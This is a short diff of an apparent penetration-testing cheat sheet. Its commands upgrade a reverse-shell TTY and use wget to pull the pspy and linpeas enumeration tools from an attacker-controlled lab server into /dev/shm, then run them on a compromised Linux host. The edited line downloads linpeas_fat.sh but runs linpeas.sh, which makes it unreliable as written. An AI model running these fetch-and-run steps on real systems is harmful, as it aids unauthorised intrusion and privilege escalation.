@@ -11,8 +11,8 @@ stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 stty columns 150 rows 150
 
-wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;/dev/shm/pspy
-wget http://192.168.45.238:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/linpeas.sh
+wget http://192.168.45.238:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.238:8000/linpeas_fat.sh -O /dev/shm/linpeas_fat.sh;chmod +x /dev/shm/linpeas_fat.sh;/dev/shm/pspy;
+/dev/shm/linpeas.sh
 
 // Pimp out linux shell
 which socat
